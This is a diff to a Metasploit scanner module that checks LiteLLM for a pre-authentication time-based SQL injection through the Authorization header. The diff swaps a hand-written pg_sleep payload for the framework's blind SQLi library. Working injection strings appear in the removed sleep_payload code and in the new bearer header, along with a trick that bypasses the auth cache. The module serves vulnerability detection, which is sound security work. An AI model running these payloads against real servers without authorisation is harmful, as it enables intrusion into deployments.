@@ -7,6 +7,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
+  include Msf::Exploit::SQLi
 
   def initialize(info = {})
     super(
@@ -24,12 +25,13 @@ class MetasploitModule < Msf::Auxiliary
           reachable before authentication. Affected versions are 1.81.16 through
           1.83.6 (fixed in 1.83.7).
 
-          The module confirms the flaw with a benign time-based check. It sends a
-          baseline request, a bearer carrying a pg_sleep payload, a second baseline
-          (which must return quickly), and a bearer carrying a doubled pg_sleep
-          payload. It reports the target vulnerable only when the injected delays
-          scale with the requested sleep while the controls stay fast, so a server
-          that is merely slow is not flagged. It does not read or exfiltrate data.
+          The module confirms the flaw with a benign time-based check built on the
+          framework's PostgreSQL time-based blind SQL injection library. It issues a
+          request whose injected predicate sleeps only when a tautology is true and a
+          second request whose predicate never sleeps, and reports the target
+          vulnerable only when the first is delayed while the second returns promptly.
+          A server that is merely slow delays both requests and is not flagged. The
+          module does not read or exfiltrate data.
 
           Detection requires the target to have provisioned at least one virtual
           key. The injectable predicate sits in a WHERE clause that PostgreSQL
@@ -61,48 +63,18 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptString.new('TARGETURI', [true, 'The LiteLLM chat completions endpoint', '/v1/chat/completions']),
-        OptInt.new('SLEEP', [true, 'Base pg_sleep delay in seconds for the time-based check', 5]),
         OptString.new('MODEL', [true, 'Model name placed in the request body (need not be a real model)', 'gpt-3.5-turbo'])
       ]
     )
-  end
 
-  def effective_sleep
-    [datastore['SLEEP'].to_i, 1].max
-  end
-
-  # Subquery-wrapped pg_sleep: pg_sleep() returns void, which cannot sit in a
-  # bare boolean OR; wrapping it in a subquery keeps the predicate valid.
-  def sleep_payload(seconds)
-    "' OR (SELECT 1 FROM (SELECT pg_sleep(#{seconds})) t) IS NOT NULL--"
-  end
-
-  # Send the chat-completions request with the given bearer value and return
-  # [response, elapsed_seconds]. Elapsed is measured with the monotonic clock so
-  # it is unaffected by wall-clock adjustments, and includes network RTT (which
-  # cancels out in the differential comparison).
-  def timed_request(bearer)
-    body = {
-      'model' => datastore['MODEL'],
-      'messages' => [{ 'role' => 'user', 'content' => 'x' }],
-      'max_tokens' => 1
-    }.to_json
-    started = Process.clock_gettime(Process::CLOCK_MONOTONIC)
-    res = send_request_cgi(
-      {
-        'method' => 'POST',
-        'uri' => normalize_uri(target_uri.path),
-        'ctype' => 'application/json',
-        'headers' => { 'Authorization' => "Bearer #{bearer}" },
-        'data' => body
-      },
-      effective_sleep * 2 + 20
+    # Msf::Exploit::SQLi registers SqliDelay with a 1.0s default. A single second
+    # is easily lost in network jitter for a remote time-based check, so raise the
+    # default to give a clearer signal while still letting the user tune it.
+    register_advanced_options(
+      [
+        OptFloat.new('SqliDelay', [false, 'Seconds to pg_sleep for the time-based check', 5.0])
+      ]
     )
-    [res, Process.clock_gettime(Process::CLOCK_MONOTONIC) - started]
-  end
-
-  def control_token
-    "control-#{Rex::Text.rand_text_alpha(8)}"
   end
 
   # Best-effort fingerprint via the unauthenticated /health endpoint.
@@ -117,68 +89,63 @@ class MetasploitModule < Msf::Auxiliary
     nil
   end
 
-  # Core time-based probe. Returns a result hash.
-  def probe
-    n = effective_sleep
-    n2 = n * 2
-    fp = fingerprint
+  # pg_sleep is evaluated once per matching row, so a populated token table can
+  # delay the response by several multiples of SqliDelay; add a fixed margin for
+  # the network round-trip on top of that.
+  def request_timeout
+    (datastore['SqliDelay'] * 4 + 20).ceil
+  end
 
-    c1_res, c1 = timed_request(control_token)
-    return { error: 'No response to the baseline request', fp: fp } unless c1_res
-
-    _a_res, t_a = timed_request(sleep_payload(n))
-    return { vulnerable: false, reason: :no_delay, c1: c1, t_a: t_a, n: n, fp: fp } unless t_a >= c1 + n * 0.6
-
-    # A control taken right after the sleep payload must still be fast. If it is
-    # also slow, the target is generally slow/degrading rather than executing our
-    # pg_sleep, so we do not flag it.
-    c2_res, c2 = timed_request(control_token)
-    return { vulnerable: false, reason: :no_baseline, c1: c1, t_a: t_a, n: n, fp: fp } unless c2_res
-    return { vulnerable: false, reason: :unstable, c1: c1, c2: c2, t_a: t_a, n: n, fp: fp } unless c2 <= c1 + n * 0.5
-
-    # Doubling the requested sleep must roughly double the added delay.
-    _b_res, t_b = timed_request(sleep_payload(n2))
-    scaled = (t_b - t_a) >= n * 0.6
-    { vulnerable: scaled, reason: (scaled ? :confirmed : :no_scaling), c1: c1, c2: c2, t_a: t_a, t_b: t_b, n: n, n2: n2, fp: fp }
+  # Builds the time-based blind SQLi probe. The framework library hands our block
+  # the boolean predicate to test; we break out of the WHERE v.token = '<token>'
+  # string literal, OR in that predicate, and comment out the trailing quote. A
+  # bearer that does not begin with "sk-" is interpolated verbatim, so the quote
+  # reaches the query and the injection lands. The random suffix sits inside the
+  # SQL comment (so it is inert) but makes every bearer unique, which defeats
+  # LiteLLM's in-memory API-key auth cache: a repeated token would otherwise be
+  # served from cache and skip the database, suppressing the pg_sleep.
+  def create_litellm_sqli
+    create_sqli(dbms: PostgreSQLi::TimeBasedBlind) do |payload|
+      body = {
+        'model' => datastore['MODEL'],
+        'messages' => [{ 'role' => 'user', 'content' => 'x' }],
+        'max_tokens' => 1
+      }.to_json
+      send_request_cgi(
+        {
+          'method' => 'POST',
+          'uri' => normalize_uri(target_uri.path),
+          'ctype' => 'application/json',
+          'headers' => { 'Authorization' => "Bearer ' OR #{payload}-- #{Rex::Text.rand_text_alphanumeric(8)}" },
+          'data' => body
+        },
+        request_timeout
+      )
+    end
   end
 
   def check_host(_ip)
-    r = probe
-    return Exploit::CheckCode::Unknown(r[:error]) if r[:error]
-    return Exploit::CheckCode::Safe('No pg_sleep-scaled delay was observed') unless r[:vulnerable]
-
-    Exploit::CheckCode::Vulnerable("Time-based SQLi: pg_sleep(#{r[:n]})=#{r[:t_a].round(2)}s, pg_sleep(#{r[:n2]})=#{r[:t_b].round(2)}s, controls #{r[:c1].round(2)}s/#{r[:c2].round(2)}s")
+    fp = fingerprint
+    if create_litellm_sqli.test_vulnerable
+      Exploit::CheckCode::Vulnerable("Time-based SQL injection via Authorization header confirmed#{fp ? " (#{fp})" : ''}")
+    else
+      Exploit::CheckCode::Safe('No time-based SQL injection signal observed')
+    end
   end
 
-  def run_host(_ip)
-    r = probe
-    if r[:error]
-      vprint_error("#{peer} - #{r[:error]}")
+  def run_host(ip)
+    code = check_host(ip)
+    unless code == Exploit::CheckCode::Vulnerable
+      print_status("#{peer} - #{code.message}")
       return
     end
 
-    vprint_status("#{peer} - Baseline #{r[:c1].round(2)}s#{r[:fp] ? " (#{r[:fp]})" : ''}")
-
-    unless r[:vulnerable]
-      case r[:reason]
-      when :no_delay
-        print_status("#{peer} - Not vulnerable (pg_sleep(#{r[:n]}) returned in #{r[:t_a].round(2)}s vs baseline #{r[:c1].round(2)}s)")
-      when :unstable
-        print_status("#{peer} - Inconclusive: target is generally slow (post-control #{r[:c2].round(2)}s vs baseline #{r[:c1].round(2)}s); not a clean pg_sleep signal")
-      when :no_scaling
-        print_status("#{peer} - Inconclusive: delay did not scale with pg_sleep (#{r[:t_a].round(2)}s at #{r[:n]}s, #{r[:t_b].round(2)}s at #{r[:n2]}s)")
-      else
-        print_status("#{peer} - Not vulnerable")
-      end
-      return
-    end
-
-    print_good("#{peer} - LiteLLM pre-auth SQL injection confirmed (CVE-2026-42208): controls #{r[:c1].round(2)}s/#{r[:c2].round(2)}s, pg_sleep(#{r[:n]})=#{r[:t_a].round(2)}s, pg_sleep(#{r[:n2]})=#{r[:t_b].round(2)}s#{r[:fp] ? "; #{r[:fp]}" : ''}")
+    print_good("#{peer} - #{code.message}")
     report_vuln(
       host: rhost,
       port: rport,
       name: name,
-      info: "Time-based blind SQLi via Authorization header; pg_sleep(#{r[:n]})=#{r[:t_a].round(2)}s vs baseline #{r[:c1].round(2)}s",
+      info: 'Time-based blind SQLi via Authorization header (pg_sleep)',
       refs: references
     )
   end
